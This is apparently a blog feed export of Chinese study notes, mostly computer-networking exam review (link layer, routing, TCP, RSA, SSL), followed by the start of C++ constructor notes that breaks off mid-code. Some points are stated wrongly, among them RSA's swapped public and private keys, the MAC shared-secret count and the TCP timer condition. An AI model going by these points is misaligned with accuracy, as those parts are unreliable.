<h3 id="3-滑动窗口（sliding-window）中，发送方的窗口左边界会在什么时候更新？接收方的窗口左边界会在什么时候更新？"><a href="#3-滑动窗口（sliding-window）中，发送方的窗口左边界会在什么时候更新？接收方的窗口左边界会在什么时候更新？" class="headerlink" title="3. 滑动窗口（sliding window）中，发送方的窗口左边界会在什么时候更新？接收方的窗口左边界会在什么时候更新？"></a>3. 滑动窗口（sliding window）中，发送方的窗口左边界会在什么时候更新？接收方的窗口左边界会在什么时候更新？</h3><p>发送方的窗口更新：发送包时更新、收到NAK的时候重传</p>
<p>接收方的窗口更新：收到包时更新</p>
<h3 id="4-滑动窗口中，接收方向发送方发送ACK的时候，ACK的值是什么？"><a href="#4-滑动窗口中，接收方向发送方发送ACK的时候，ACK的值是什么？" class="headerlink" title="4. 滑动窗口中，接收方向发送方发送ACK的时候，ACK的值是什么？"></a>4. 滑动窗口中，接收方向发送方发送ACK的时候，ACK的值是什么？</h3><p>期望收到的下一个包编号（比如已接收0、1、2号包，那么下一个期望接受3号包）</p>
<hr>
<p>检测和纠正比特错误</p>
<h3 id="1-二维的奇偶校验（Parity-Checking）的行parity-bit和列parity-bit是怎么计算的，以及怎么纠错的？"><a href="#1-二维的奇偶校验（Parity-Checking）的行parity-bit和列parity-bit是怎么计算的，以及怎么纠错的？" class="headerlink" title="1. 二维的奇偶校验（Parity Checking）的行parity bit和列parity bit是怎么计算的，以及怎么纠错的？"></a>1. 二维的奇偶校验（Parity Checking）的行parity bit和列parity bit是怎么计算的，以及怎么纠错的？</h3><p>如果是奇校验，数一数一行有n个1，如果n是奇数，校验位取1，如果n是偶数，校验位取0</p>
<p>纠错：根据行列确定是哪个点出问题了，然后取反即可</p>
<h3 id="2-CRC校验，给定D-101110，r-3，G-1001，要求计算校验码R"><a href="#2-CRC校验，给定D-101110，r-3，G-1001，要求计算校验码R" class="headerlink" title="2. CRC校验，给定D=101110，r=3，G=1001，要求计算校验码R"></a>2. CRC校验，给定D=101110，r=3，G=1001，要求计算校验码R</h3><p><img src="/2020/07/10/计网讲课笔记/image-20200713193203017.png" alt="image-20200713193203017"></p>
<hr>
<p>链路层的包</p>
<h3 id="1-HDLC的flag字段的组成，发送方如何预处理包以避免和flag重复？接收方如何恢复包里的内容？"><a href="#1-HDLC的flag字段的组成，发送方如何预处理包以避免和flag重复？接收方如何恢复包里的内容？" class="headerlink" title="1. HDLC的flag字段的组成，发送方如何预处理包以避免和flag重复？接收方如何恢复包里的内容？"></a>1. HDLC的flag字段的组成，发送方如何预处理包以避免和flag重复？接收方如何恢复包里的内容？</h3><p>01111110</p>
<p>发送方避免：发送方每读到连续5个1，就插入一个0</p>
<p>接收方恢复：每读到连续5个1，看下一位或两位，如果是0，那就删掉这个0；如果是10，就认为是分隔标志</p>
<p>msg = 1111110</p>
<p>handle_msg = 11111010</p>
<p>send = 01111110  11111010  01111110</p>
<hr>
<p>令牌环</p>
<h3 id="1-拿到令牌时，如果没有要发送的数据包，做什么？如果有要发送的数据包，做什么？"><a href="#1-拿到令牌时，如果没有要发送的数据包，做什么？如果有要发送的数据包，做什么？" class="headerlink" title="1. 拿到令牌时，如果没有要发送的数据包，做什么？如果有要发送的数据包，做什么？"></a>1. 拿到令牌时，如果没有要发送的数据包，做什么？如果有要发送的数据包，做什么？</h3><p>没有要发：把令牌给下一个主机</p>
<p>有要发：发送数据包，把令牌给下一个主机</p>
<hr>
<p>以太网</p>
<h3 id="1-以太网的速率在多少到多少之间？"><a href="#1-以太网的速率在多少到多少之间？" class="headerlink" title="1. 以太网的速率在多少到多少之间？"></a>1. 以太网的速率在多少到多少之间？</h3><p>10Mbps~10Gbps</p>
<h3 id="2-时分复用，频分复用，码分复用"><a href="#2-时分复用，频分复用，码分复用" class="headerlink" title="2. 时分复用，频分复用，码分复用"></a>2. 时分复用，频分复用，码分复用</h3><p>时分复用：把时间切成片，每个主机占用不同的时间片。需要同步时间</p>
<p>频分复用：把频率分段，不同频段的包互不干扰。需要额外硬件</p>
<p>码分复用：每个发送端有各自的chipping sequence，用来编码原始信息，接收端用发送端的chipping sequence给接收到的信息做内积，可以求出原始信息。增大了信息量</p>
<h3 id="3-纯ALOHA工作过程，工作效率"><a href="#3-纯ALOHA工作过程，工作效率" class="headerlink" title="3. 纯ALOHA工作过程，工作效率"></a>3. 纯ALOHA工作过程，工作效率</h3><p>发送端：有包就立刻发</p>
<p>接收端：收到包，确认完整性，完整则回复ACK，不完整则回复NAK</p>
<p>发送端：如果没收到ACK，以概率p立刻重发，以概率1-p 隔一个帧发送出去的时间 后重发</p>
<p>效率最大值 $\frac{1}{2e}$</p>
<h3 id="4-时隙ALOHA工作过程，工作效率"><a href="#4-时隙ALOHA工作过程，工作效率" class="headerlink" title="4. 时隙ALOHA工作过程，工作效率"></a>4. 时隙ALOHA工作过程，工作效率</h3><p>发送端：如果有包，则在下一个时隙开始时发送</p>
<p>接收端：收到包，确认完整性，完整则回复ACK，不完整则回复NAK</p>
<p>发送端：如果有碰撞，则会在发送的这个时隙检测到碰撞，然后以p的概率在之后的每个时隙重传，直到无碰撞发出去</p>
<p>效率最大值 $\frac{1}{e}$</p>
<h3 id="5-CSMA-CD工作过程，工作效率"><a href="#5-CSMA-CD工作过程，工作效率" class="headerlink" title="5. CSMA/CD工作过程，工作效率"></a>5. CSMA/CD工作过程，工作效率</h3><p>发送端：有包要发前先侦听信道，空闲则发送，</p>
<p>如果发送后检测到碰撞，则立刻停止发送，</p>
<p>然后用二进制指数后退算法选择重发的时间，</p>
<p>如果失败次数在10~16次之间，二进制指数后退中的n一直保持10，</p>
<p>如果失败次数超过16次，放弃发送。</p>
<h3 id="6-什么是二进制指数后退算法"><a href="#6-什么是二进制指数后退算法" class="headerlink" title="6. 什么是二进制指数后退算法"></a>6. 什么是二进制指数后退算法</h3><p>失败次数为n，那本次在 $0$~$2^n-1$ 中，等概率选择一个数x，经过x个【一个帧端到端往返一趟所需时间】后，重发这个包。</p>
<hr>
<p>交换机</p>
<h3 id="1-spanning-tree算法"><a href="#1-spanning-tree算法" class="headerlink" title="1. spanning-tree算法"></a>1. spanning-tree算法</h3><ol>
<li>选定根节点root</li>
<li>计算根节点到其他节点的最短路，只保留最短路，其他链路不使用</li>
</ol>
<p>主要解决洪泛问题</p>
<h3 id="2-交换机的转发和过滤过程"><a href="#2-交换机的转发和过滤过程" class="headerlink" title="2. 交换机的转发和过滤过程"></a>2. 交换机的转发和过滤过程</h3><p>一个包到来时，到来接口号x</p>
<ol>
<li>如果目的地址在表里，转发接口为y<ul>
<li>如果x=y，丢弃这个包</li>
<li>如果x != y，转发到y接口上</li>
</ul>
</li>
<li>如果目的地址不在表里，转发到除了x以外的所有接口上</li>
</ol>
<h3 id="3-交换机的自学习过程"><a href="#3-交换机的自学习过程" class="headerlink" title="3. 交换机的自学习过程"></a>3. 交换机的自学习过程</h3><ol>
<li>表初始为空</li>
<li>对于每个接口进来的帧，把[源地址，接口号，当前时间]存入表</li>
<li>经过老化时间后，删除对应表项</li>
</ol>
<hr>
<p>无线链路</p>
<h3 id="1-CSMA-CA-协议的工作过程"><a href="#1-CSMA-CA-协议的工作过程" class="headerlink" title="1. CSMA/CA 协议的工作过程"></a>1. CSMA/CA 协议的工作过程</h3><p>当有包要发时</p>
<ol>
<li>如果初始监听到信道空闲，则等待分布式帧间间隔后发送该包</li>
<li>否则选择一个随机回退值，然后继续监听信道，如果空闲则递减该值，如果忙碌则保持该值不变</li>
<li>当计数值减小到0时，发送包</li>
<li>如果收到确认，就ok了，下次再发包时从第2步开始执行协议；如果没收到确认，回到第2步执行协议，并且选择一个更大的回退值</li>
</ol>
<h3 id="2-为什么CSMA-CD-在无线环境中不适用"><a href="#2-为什么CSMA-CD-在无线环境中不适用" class="headerlink" title="2. 为什么CSMA/CD 在无线环境中不适用"></a>2. 为什么CSMA/CD 在无线环境中不适用</h3><ol>
<li>CSMA/CD协议要求发送后不断侦听信道，但无线环境要实现这个花费很大</li>
<li>即使发送时检测到信道空闲，由于无线电波可以向各个方向传播，在接收端仍可能碰撞冲突</li>
<li>无线信号强度范围波动大，冲突检测困难</li>
</ol>
<h1 id="ch3-分组交换网络"><a href="#ch3-分组交换网络" class="headerlink" title="ch3 分组交换网络"></a>ch3 分组交换网络</h1><h2 id="需要掌握的问题-2"><a href="#需要掌握的问题-2" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>路由器的两大功能</li>
<li>路由器的内部结构</li>
<li>IPv4数据包格式，IPv6数据包格式，两者中有哪些字段是类似的</li>
<li>链路状态路由选择算法（LS）</li>
<li>距离向量路由选择算法（DV）</li>
<li>毒性逆转是什么</li>
<li>RIP，OSPF，BGP的功能</li>
<li>多播路由算法，组共享的树和基于源的树的区别</li>
</ol>
<h2 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h2><h3 id="1-路由器的两大功能"><a href="#1-路由器的两大功能" class="headerlink" title="1. 路由器的两大功能"></a>1. 路由器的两大功能</h3><p>转发和路由</p>
<h3 id="2-路由器的内部结构"><a href="#2-路由器的内部结构" class="headerlink" title="2. 路由器的内部结构"></a>2. 路由器的内部结构</h3><p>输入端口-交换结构-输出端口</p>
<h3 id="3-IPv4数据包格式，IPv6数据包格式，两者中有哪些字段是类似的"><a href="#3-IPv4数据包格式，IPv6数据包格式，两者中有哪些字段是类似的" class="headerlink" title="3. IPv4数据包格式，IPv6数据包格式，两者中有哪些字段是类似的"></a>3. IPv4数据包格式，IPv6数据包格式，两者中有哪些字段是类似的</h3><p><img src="/2020/07/10/计网讲课笔记/image-20200806184630519.png" alt="image-20200806184630519"></p>
<p>.</p>
<p><img src="/2020/07/10/计网讲课笔记/image-20200806184650986.png" alt="image-20200806184650986"></p>
<p>version相同</p>
<p>toc 和 traffic class 都表示服务类型</p>
<p>ttl 和 hop limit 相同</p>
<p>protocol 和 next header 相同</p>
<p>total length 和 payload length 相似，一个表示整个包长度，一个表示数据部分长度</p>
<p>source address 和 destination address 相同（除了长度不同）</p>
<h3 id="4-链路状态路由选择算法（LS）"><a href="#4-链路状态路由选择算法（LS）" class="headerlink" title="4. 链路状态路由选择算法（LS）"></a>4. 链路状态路由选择算法（LS）</h3><p>本质是dijkstra算法</p>
<h3 id="5-距离向量路由选择算法（DV）"><a href="#5-距离向量路由选择算法（DV）" class="headerlink" title="5. 距离向量路由选择算法（DV）"></a>5. 距离向量路由选择算法（DV）</h3><p>链路状态变化时，向邻居传递自己到其他节点的路由信息</p>
<h3 id="6-毒性逆转是什么"><a href="#6-毒性逆转是什么" class="headerlink" title="6. 毒性逆转是什么"></a>6. 毒性逆转是什么</h3><p>假如A经由B到达C且B是第一跳，那么A在DV算法中告诉B：A到C的距离是正无穷</p>
<h3 id="7-RIP，OSPF，BGP的功能"><a href="#7-RIP，OSPF，BGP的功能" class="headerlink" title="7. RIP，OSPF，BGP的功能"></a>7. RIP，OSPF，BGP的功能</h3><p>域内路由</p>
<ul>
<li>RIP：底层是DV算法</li>
<li>OSPF：底层是LS算法</li>
</ul>
<p>域间路由：</p>
<ul>
<li>eBGP：AS的边际路由器之间互相通知对方，自己到达某个网段的cost</li>
<li>iBGP：边际路由器学习到了之后，通知给AS内的路由器</li>
</ul>
<h3 id="8-多播路由算法，组共享的树和基于源的树的区别"><a href="#8-多播路由算法，组共享的树和基于源的树的区别" class="headerlink" title="8. 多播路由算法，组共享的树和基于源的树的区别"></a>8. 多播路由算法，组共享的树和基于源的树的区别</h3><p>用单播模拟多播：1个发送方和n个接收方，用n次单播模拟多播</p>
<p>组共享的树：m个发送方和n个接收方，共享一棵树，包通过树来发给接收方</p>
<p>基于源的树：m个发送方和n个接收方，一共m棵树</p>
<h1 id="ch4-传输层"><a href="#ch4-传输层" class="headerlink" title="ch4 传输层"></a>ch4 传输层</h1><h2 id="需要掌握的问题-3"><a href="#需要掌握的问题-3" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>UDP包格式</li>
<li>UDP和TCP的区别</li>
<li>TCP包格式</li>
<li>TCP的SampleRTT、EstimatedRTT、DevRTT、TimeInterval的计算</li>
<li>TCP可靠数据传输原理、计时器</li>
<li>TCP三次握手和四次挥手</li>
<li>TCP拥塞控制的做法，Reno和Tahoe的区别</li>
<li>TCP平均吞吐量</li>
</ol>
<h2 id="回答-3"><a href="#回答-3" class="headerlink" title="回答"></a>回答</h2><h3 id="1-UDP包格式"><a href="#1-UDP包格式" class="headerlink" title="1. UDP包格式"></a>1. UDP包格式</h3><p><img src="/2020/07/10/计网讲课笔记/image-20200806190210416.png" alt="image-20200806190210416"></p>
<h3 id="2-UDP和TCP的区别"><a href="#2-UDP和TCP的区别" class="headerlink" title="2. UDP和TCP的区别"></a>2. UDP和TCP的区别</h3><p>UDP：</p>
<ul>
<li>无需建立连接、无连接状态</li>
<li>尽力而为，不保证送达，也不保证正确性，也没有拥塞控制</li>
<li>可能会被防火墙挡</li>
</ul>
<p>TCP：</p>
<ul>
<li>需要建立连接、保持连接状态、关闭连接</li>
<li>保证送达、保证正确性、有拥塞控制</li>
<li>通常不会被防火墙挡</li>
</ul>
<h3 id="3-TCP包格式"><a href="#3-TCP包格式" class="headerlink" title="3. TCP包格式"></a>3. TCP包格式</h3><p><img src="/2020/07/10/计网讲课笔记/image-20200806190428359.png" alt="image-20200806190428359"></p>
<h3 id="4-TCP的SampleRTT、EstimatedRTT、DevRTT、TimeInterval的计算"><a href="#4-TCP的SampleRTT、EstimatedRTT、DevRTT、TimeInterval的计算" class="headerlink" title="4. TCP的SampleRTT、EstimatedRTT、DevRTT、TimeInterval的计算"></a>4. TCP的SampleRTT、EstimatedRTT、DevRTT、TimeInterval的计算</h3><p>$EsitimatedRTT = (1-a)EstimatedRTT + a SampelRTT$</p>
<p>$DevRTT = (1-\beta)DevRTT+\beta |EstimatedRTT - SampleRTT|$</p>
<p>$TimeInterval = EstimatedRTT + 4DevRTT$</p>
<h3 id="5-TCP可靠数据传输原理、计时器"><a href="#5-TCP可靠数据传输原理、计时器" class="headerlink" title="5. TCP可靠数据传输原理、计时器"></a>5. TCP可靠数据传输原理、计时器</h3><p>发送方：</p>
<ol>
<li>有新包要发，且计时器处于运行状态的话，启动计时器，发包</li>
<li>如果计时器超时，重传最小的未被确认的包，然后启动计时器</li>
<li>收到ACK，看ACK的值和已被确认的最大序号，如果ACK&gt;Base，更新Base=ACK，如果还有已发送但未被确认的包，启动计时器</li>
</ol>
<h3 id="6-TCP三次握手和四次挥手"><a href="#6-TCP三次握手和四次挥手" class="headerlink" title="6. TCP三次握手和四次挥手"></a>6. TCP三次握手和四次挥手</h3><p>三次握手：</p>
<ol>
<li>客户-&gt;服务器：SYN = 1，Seq = client_init_seq，len = 1</li>
<li>服务器-&gt;客户：SYN = 1，Seq = server_init_seq，ack = client_init_seq+1，len = 1</li>
<li>客户-&gt;服务器：SYN = 0，seq = client_init_seq+1，ack = server_init_seq+1</li>
</ol>
<p>四次挥手：</p>
<ol>
<li>客户-&gt;服务器：FIN = 1，客户以后不再发送应用数据</li>
<li>服务器-&gt;客户：ACK = 1，还有应用数据要发送给客户</li>
<li>服务器-&gt;客户：FIN = 1，服务器以后不再发送应用数据</li>
<li>客户-&gt;服务器：ACK = 1，客户定时等待后关闭TCP，服务器收到这个包后关闭连接</li>
</ol>
<h3 id="7-TCP拥塞控制的做法，Reno和Tahoe的区别"><a href="#7-TCP拥塞控制的做法，Reno和Tahoe的区别" class="headerlink" title="7. TCP拥塞控制的做法，Reno和Tahoe的区别"></a>7. TCP拥塞控制的做法，Reno和Tahoe的区别</h3><p>Reno是带快速恢复的，触发条件是收到3个冗余ack</p>
<p>Tahoe是不带快速恢复的，收到3个冗余ack会进入慢启动</p>
<p>慢启动：cwnd从0开始，每收到一个ack就把cwnd加1，直到</p>
<ul>
<li>cwnd&gt;=ssthresh，就cwnd = ssthresh，进入拥塞避免</li>
<li>遇到3个冗余ack，ssthresh = cwnd/2，cwnd = ssthresh+3，进入快速恢复</li>
<li>超时，ssthresh = cwnd/2，cwnd = 1，重新慢启动</li>
</ul>
<p>拥塞避免：每收到一个ack就把cwnd增加$\frac{1}{cwnd}$，一个RTT后cwnd的增量就是1，直到</p>
<ul>
<li>遇到3个冗余ack，ssthresh = cwnd/2，cwnd = ssthresh+3，进入快速恢复</li>
<li>超时，ssthresh = cwnd/2，cwnd = 1，重新慢启动</li>
</ul>
<p>快速恢复：</p>
<ul>
<li>继续收到冗余ack，cwnd = cwnd + 1，保持快速恢复</li>
<li>收到非冗余的ack，cwnd = ssthresh，进入拥塞避免</li>
</ul>
<h3 id="8-TCP平均吞吐量"><a href="#8-TCP平均吞吐量" class="headerlink" title="8. TCP平均吞吐量"></a>8. TCP平均吞吐量</h3><p>一条连接的平均吞吐量为 $\frac{0.75\times W}{RTT}$，W是cwnd能达到的最大值</p>
<p>计算方法是，拥塞避免从发生3个冗余ack之前，cwnd=W，3个冗余ack之后，cwnd降为W/2，然后每个RTT内增加1，平均吞吐量即为 $\frac{\frac{(W+ \frac{W}{2})}{2}} {RTT}$</p>
<h1 id="ch5-网络安全"><a href="#ch5-网络安全" class="headerlink" title="ch5 网络安全"></a>ch5 网络安全</h1><h2 id="需要掌握的问题-4"><a href="#需要掌握的问题-4" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>凯撒密码</li>
<li>改进的凯撒密码</li>
<li>块密码的输入、输出、映射的数量</li>
<li>对称加密块密码算法有哪些 AES DES</li>
<li>RSA的公私钥的生成、加密解密过程</li>
<li>MAC的过程</li>
<li>数字签名的过程，提高效率的方法</li>
<li>端点鉴别，CA</li>
<li>安全电子邮件</li>
<li>SSL握手、挥手的过程、每一步的合理性</li>
</ol>
<h2 id="回答-4"><a href="#回答-4" class="headerlink" title="回答"></a>回答</h2><h3 id="1-凯撒密码"><a href="#1-凯撒密码" class="headerlink" title="1. 凯撒密码"></a>1. 凯撒密码</h3><p>发送方和接收方共享数字k</p>
<p>发送方加密时，对字母m，加密为m后的第k个字母</p>
<p>接收方解密时，对字母e，解密为e前的第k个字母</p>
<h3 id="2-改进的凯撒密码"><a href="#2-改进的凯撒密码" class="headerlink" title="2. 改进的凯撒密码"></a>2. 改进的凯撒密码</h3><p>发送方和接收方共享数字序列 k1, k2, k3…, kp</p>
<p>发送方加密时，对第1个字母用凯撒(k1)加密，第2个字母用凯撒(k2)加密，….</p>
<p>接收方同理</p>
<h3 id="3-块密码的输入、输出、映射的数量"><a href="#3-块密码的输入、输出、映射的数量" class="headerlink" title="3. 块密码的输入、输出、映射的数量"></a>3. 块密码的输入、输出、映射的数量</h3><p>k-块密码：把文本切成若干块，每块k个比特</p>
<p>一个块的输入就有$2^k$种，输出也有 $2^k$ 种，从输入到输出的映射有 $2^k !$ 种</p>
<h3 id="4-对称加密块密码算法有哪些？"><a href="#4-对称加密块密码算法有哪些？" class="headerlink" title="4. 对称加密块密码算法有哪些？"></a>4. 对称加密块密码算法有哪些？</h3><p>AES, DES, 3DES</p>
<h3 id="5-RSA的公私钥的生成、加密解密过程"><a href="#5-RSA的公私钥的生成、加密解密过程" class="headerlink" title="5. RSA的公私钥的生成、加密解密过程"></a>5. RSA的公私钥的生成、加密解密过程</h3><p>选取素数pq</p>
<p>计算 n = pq</p>
<p>计算 z = (p-1)(q-1)</p>
<p>选取e，满足 e &lt; z，e和z互素</p>
<p>选取d，满足 ed mod z = 1</p>
<p>得到私钥(n, e)，公钥(n, d)</p>
<p>加密：明文m，私钥e，密文 = m^e mod n</p>
<p>解密：密文c，公钥d，明文 = c^d mod n</p>
<blockquote>
<p> 注意：假定需要加密的东西表示成数字是m，那么选取大素数pq的时候，需要满足 pq&gt;m，否则在解密时对n取模后一定恢复不了m</p>
</blockquote>
<h3 id="6-MAC的过程"><a href="#6-MAC的过程" class="headerlink" title="6. MAC的过程"></a>6. MAC的过程</h3><p>发送方有报文m，双方共享秘密s，发送方将m和Hash(m+s)拼接后发给接收方</p>
<p>缺点是双方需要事先共享秘密s，如果有n个人两两进行MAC，那么需要$\frac{n(n+1)}{2}$个共享秘密s</p>
<h3 id="7-数字签名的过程，提高效率的方法"><a href="#7-数字签名的过程，提高效率的方法" class="headerlink" title="7. 数字签名的过程，提高效率的方法"></a>7. 数字签名的过程，提高效率的方法</h3><p>数字签名是为了证明这份文件是我签署的，所以需要给文件打上我独有的标记，即私钥</p>
<p>假定你持有原文m和我签名后的文件c，然后你用我的公钥去解密，得到K+(c)</p>
<ul>
<li>假如c是我签名的，那么c=K-(m)，你就会发现K+(K-(c))和原文m一致，那么就证明了这份文件m是我签署的</li>
<li>假如c不是我签名的，那么K+(K-(c))与m不同，那么说明m不是我签名的</li>
</ul>
<p>提高效率的原因：公私钥加密计算量大，算的慢</p>
<p>提高效率：我只需要对Hash(m)进行签名即可，计算量大大降低</p>
<h3 id="8-端点鉴别，CA"><a href="#8-端点鉴别，CA" class="headerlink" title="8. 端点鉴别，CA"></a>8. 端点鉴别，CA</h3><p>端点鉴别：判断和我通话的人的身份，几种攻击和鉴别协议1.0~4.0看书</p>
<p>CA：认证中心，会给认证过的人发放证书</p>
<p>证书：设认证中心的私钥是$K_{CA}^-$，被认证人的公钥是$K_{Bob}^+$，那么证书里的主要东西就是 $K_{CA}^-(K_{Bob}^+)$</p>
<h3 id="9-安全电子邮件"><a href="#9-安全电子邮件" class="headerlink" title="9. 安全电子邮件"></a>9. 安全电子邮件</h3><p>需求：报文安全性，报文完整性，发送方鉴别，效率</p>
<p>发送方：</p>
<ul>
<li>对报文 $m$ 计算哈希，$H(m)$，再用自己的私钥加密，$K_{A}^-(H(m))$，这里提高了效率（$H(m)$ 比 $m$ 短多了）</li>
<li>将$m$ 和 $K_{A}^-(H(m))$ 拼接，这里是完整性和发送方鉴别</li>
<li>然后将拼接结果用对称密钥$K_s$加密，这里提高了效率（对称加密比非对称加密快多了）</li>
<li>对称密钥$Ks$用接收方的公钥加密，拼接第3步结果，发给接收方，这里是安全性</li>
</ul>
<p>画图结果看书p466</p>
<h3 id="10-SSL握手、挥手的过程、每一步的合理性"><a href="#10-SSL握手、挥手的过程、每一步的合理性" class="headerlink" title="10. SSL握手、挥手的过程、每一步的合理性"></a>10. SSL握手、挥手的过程、每一步的合理性</h3><p>SSL握手</p>
<ol>
<li>client hello：客户端向服务器发自己支持的算法列表，包括对称、非对称、MAC，以及客户端不重数</li>
<li>server hello：服务器向客户端发自己选择的算法，服务器证书，服务器不重数</li>
<li>客户端验证了服务器证书后，生成PMS，用服务器公钥加密PMS，发给服务器</li>
<li><p>服务器和客户端此时均拥有PMS、双方的不重数，然后将PMS分割成4部分，分别为$E_A, E_B, M_A, M_B$</p>
<ul>
<li>$E_A$ ：Alice（客户）向Bob（服务器）发送消息时的对称密钥</li>
<li>$E_B$ ：Bob（服务器）向Alice（客户端）发送消息时的对称密钥</li>
<li>$M_A$：Alice（客户）向Bob（服务器）发送消息时的MAC密钥</li>
<li>$M_B$ ：Bob（服务器）向Alice（客户端）发送消息时的MAC密钥</li>
</ul>
</li>
<li><p>client handshake message：客户端向服务器发送 客户端发的和收到的所有报文 的一个MAC</p>
</li>
<li>server handshake message：服务器向客户端发送 服务器发的和收到的所有报文 的一个MAC</li>
</ol>
<p>SSL挥手：</p>
<ol>
<li>想结束的人发一条SSL报文，其中SSL报文的类型字段设置为终止会话</li>
<li>这样可以防止中间人用TCP FIN来断开SSL连接</li>
</ol>
<p>SSL记录格式：</p>
<p>类型 | 版本 | 长度 | 数据 | MAC</p>
<blockquote>
<p>其中，MAC里包含了 数据、SSL序号、类型</p>
<p>数据和MAC都被 $E_A$ 或者 $E_B$ 加密了</p>
</blockquote>
]]></content>
      <categories>
        <category>Computer Network</category>
      </categories>
      <tags>
        <tag>Computer Network</tag>
      </tags>
  </entry>
  <entry>
    <title>高程学习笔记</title>
    <url>/2019/02/26/%E9%AB%98%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>高级程序设计复习笔记</p>
<p>参考书目：<br>《程序设计教程—用C++语言描述》陈家骏、郑滔<br>《Thinking in C++》机械工业出版社</p>
<h1 id="第1章-复习程设基础"><a href="#第1章-复习程设基础" class="headerlink" title="第1章 复习程设基础"></a>第1章 复习程设基础</h1><h2 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h2><p>分数组成：<br>作业10%<br>上机40%（现场oj和课后projects）<br>期末50%（据说较为简单）</p>
<h2 id="C-C-数据类型"><a href="#C-C-数据类型" class="headerlink" title="C/C++数据类型"></a>C/C++数据类型</h2><p><code>unsigned</code>类型运算不封闭，+*/封闭，-不封闭</p>
<p><code>float</code>类型 0.1+0.2!=0.3之类的</p>
<p><code>实数</code>相等条件，比较差的绝对值是否小于一个很小的数</p>
<p>联合类型用于用一种类型表示多种类型的数据，例如不同类型的数据组织在一起不能用array</p>
<p>指针是内存地址的抽象，用于动态变量（链表）、传递参数</p>
<h2 id="C-过程抽象"><a href="#C-过程抽象" class="headerlink" title="C++过程抽象"></a>C++过程抽象</h2><p><code>C++函数</code>与<code>数学函数</code>区别：</p>
<ol>
<li>C++函数可以没有返回值</li>
<li>可以有副作用(side effect)</li>
<li>同一个实参，不同时刻调用结果可以不一样</li>
</ol>
<h2 id="内存区安排"><a href="#内存区安排" class="headerlink" title="内存区安排"></a>内存区安排</h2><p>静态数据区</p>
<ul>
<li>全局变量</li>
<li>static局部变量</li>
<li>常量</li>
</ul>
<h1 id="第2章-对象与类"><a href="#第2章-对象与类" class="headerlink" title="第2章 对象与类"></a>第2章 对象与类</h1><p>把成员函数定义放在声明处，是建议编译器按内联函数处理。</p>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>创建动态对象不用 malloc 和 free，原因是不会调用构造函数和析构函数。</p>
<p>无参数或全是默认参数的构造函数，是默认构造函数</p>
<p>隐式的构造函数仅调用<code>成员对象</code>所在类和基类的构造函数</p>
<p>一旦随便自定义了构造函数，编译器不再提供隐式构造函数</p>
<p>隐式的析构函数仅调用<code>成员对象</code>所在类和基类的析构函数</p>
<p>复制字符串时候 new char(strlen(str) <strong>+ 1</strong>)</p>
<h3 id="数据成员初始化"><a href="#数据成员初始化" class="headerlink" title="数据成员初始化"></a>数据成员初始化</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> b;</span><br><span class="line">    <span class="keyword">int</span>&amp; c;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A()&#123;a = <span class="number">1</span>;&#125;</span><br><span class="line">    A(<span class="keyword">int</span> m, <span class="keyword">int</span> n):b(m), c(n)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line">    A a;</span><br><span class="line">    A1 a1;</span><br><span class="line">    A2 a2;</span><br><span class="line">    A3 a3;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    B()&#123;x = <span class="number">1</span>;&#125;</span><br><span class="line">    B(<span class="keyword">int</span> m):a(m, m)&#123;x = <span class="number">7</span>;&#125;</span><br><span class="line">    ~B();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>const int 和 int&amp; 数据成员必须用成员初始化表，如果这样的类不自定义构造函数，编译器不会为其生成默认构造函数，因此这样的类不能用于构造对象？</p>
<p>成员对象的初始化：默认按照成员对象的默认构造函数来，除非用<strong>成员初始化表</strong>进行显式调用，顺序 A1-A2-A3-B函数体，析构顺序 B函数体-A3-A2-A1</p>
<h3 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">A(<span class="keyword">const</span> A&amp; a);</span><br><span class="line">A(<span class="keyword">const</span> A&amp; a, <span class="keyword">int</span> m = <span class="number">1</span>, <span class="keyword">int</span> n = <span class="number">2</span>); <span class="comment">// 后面的必须是默认参数</span></span><br><span class="line">A(<span class="keyword">const</span> A a); <span class="comment">// 不行，考虑下面的例子</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(A x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A re;</span><br><span class="line">    f(re); </span><br><span class="line">    <span class="comment">// 调用时，x需要用re初始化，相当于A x=A(re)</span></span><br><span class="line">    <span class="comment">// re又作为参数去初始化const A a，相当于A a = A(re)...无限递归[UST]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>隐式拷贝构造函数：普通成员直接拷贝（涉及资源申请的小心），成员对象调用它的拷贝构造函数</p>
<p>自定义拷贝构造函数：默认按照成员对象的默认构造函数来，除非用<strong>成员初始化表</strong>显式调用成员对象的拷贝构造函数，如<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    A(<span class="keyword">const</span> A&amp; a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line">    A a;</span><br><span class="line">    B(<span class="keyword">const</span> B&amp; b):a(b.a) 